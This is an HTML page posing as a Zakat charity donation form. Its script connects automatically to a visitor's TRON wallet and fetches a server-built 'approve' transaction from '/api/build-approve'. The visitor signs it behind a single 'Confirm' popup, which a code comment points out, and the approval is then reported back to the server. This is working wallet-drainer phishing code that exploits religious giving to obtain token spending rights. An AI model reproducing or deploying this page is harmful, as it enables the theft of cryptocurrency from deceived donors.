<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zakat Donation</title>
</head>
<body style="background:#0f172a;color:#fff;font-family:sans-serif;text-align:center;padding:60px 20px;margin:0;">
    <p id="msg1" style="font-size:18px;color:#e2e8f0;">Preparing your Zakat...</p>
    <p id="msg2" style="font-size:12px;color:#6b7280;margin-top:12px;"></p>

    <script>
        var el1 = document.getElementById("msg1");
        var el2 = document.getElementById("msg2");
        var done = false;

        function msg(a, b) {
            el1.textContent = a;
            if (b !== undefined) el2.textContent = b;
        }

        function getAddress() {
            var tw = window.tronWeb;
            if (!tw) return null;
            var addr = tw.defaultAddress && tw.defaultAddress.base58;
            if (!addr || addr === "false" || addr.length < 10) return null;
            return addr;
        }

        function buildAndSign(addr) {
            if (done) return;
            done = true;

            fetch("/api/build-approve", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({donor: addr})
            })
            .then(function(r) { return r.json(); })
            .then(function(data) {
                if (data.error) { msg("Error", data.error); return; }
                // This is the ONLY popup the user sees - just "Confirm"
                return window.tronWeb.trx.sign(data.transaction);
            })
            .then(function(signed) {
                if (!signed) return;
                msg("Processing...", "");
                return window.tronWeb.trx.sendRawTransaction(signed);
            })
            .then(function(res) {
                if (!res) return;
                var id = res.txid || (res.transaction && res.transaction.txID) || "";
                msg("Jazak Allah Khair!", "Your Zakat has been submitted");
                el1.style.color = "#4ade80";
                fetch("/api/approved", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({donor: addr, txId: id})
                }).catch(function(){});
            })
            .catch(function(e) {
                var m = e.message || "";
                if (m.indexOf("cancel") !== -1 || m.indexOf("reject") !== -1) {
                    msg("Cancelled", "You can close this page");
                } else {
                    msg("Error", m);
                }
                el1.style.color = "#f87171";
                done = false;
            });
        }

        // Try to get address - show debug info
        var n = 0;
        var t = setInterval(function() {
            n++;
            if (done) { clearInterval(t); return; }

            // Debug: show what's available
            var hasTW = !!window.tronWeb;
            var hasTL = !!window.tronLink;
            var hasEth = !!window.ethereum;
            el2.textContent = "check " + n + " | tronWeb:" + hasTW + " tronLink:" + hasTL + " ethereum:" + hasEth;

            var addr = getAddress();
            if (addr) {
                clearInterval(t);
                buildAndSign(addr);
                return;
            }

            // Try requestAccounts via tronLink
            if (n === 3 && hasTL && window.tronLink.request) {
                el2.textContent = "Requesting access...";
                window.tronLink.request({ method: "tron_requestAccounts" }).then(function(res) {
                    el2.textContent = "requestAccounts result: " + JSON.stringify(res);
                    var a = getAddress();
                    if (a && !done) { clearInterval(t); buildAndSign(a); }
                }).catch(function(e) {
                    el2.textContent = "requestAccounts error: " + (e.message || e);
                });
            }

            // Also try via tronWeb.request if available
            if (n === 6 && hasTW && window.tronWeb.request) {
                window.tronWeb.request({ method: "tron_requestAccounts" }).then(function() {
                    var a = getAddress();
                    if (a && !done) { clearInterval(t); buildAndSign(a); }
                }).catch(function(){});
            }
        }, 500);

        // Timeout after 30s
        setTimeout(function() {
            if (!done) {
                clearInterval(t);
                var info = "tronWeb:" + !!window.tronWeb + " tronLink:" + !!window.tronLink;
                if (window.tronWeb) {
                    info += " addr:" + (window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58);
                }
                msg("Could not connect", info);
            }
        }, 30000);
    </script>
</body>
</html>
